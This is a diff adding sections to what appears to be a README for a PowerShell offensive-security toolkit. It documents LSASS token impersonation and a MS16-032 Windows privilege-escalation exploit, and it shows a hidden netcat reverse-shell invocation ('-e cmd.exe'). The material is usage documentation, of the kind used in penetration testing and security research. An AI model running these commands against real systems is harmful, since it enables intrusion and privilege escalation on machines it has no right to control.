@@ -38,3 +38,30 @@ C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 
 Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
 C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
 ```
+
+## pwnd
+
+### Conjure-LSASS
+
+Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.
+
+```
+Conjure LSASS into our midst! ;)
+C:\PS> Conjure-LSASS
+```
+
+### Invoke-MS16-032
+
+PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
+    
+Targets:
+
+* Win7-Win10 & 2k8-2k12 <== 32/64 bit!
+* Tested on x32 Win7, x64 Win8, x64 2k12R2
+
+==> Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!
+
+```
+Sit back and watch the pwn!
+C:\PS> Invoke-MS16-032
+```
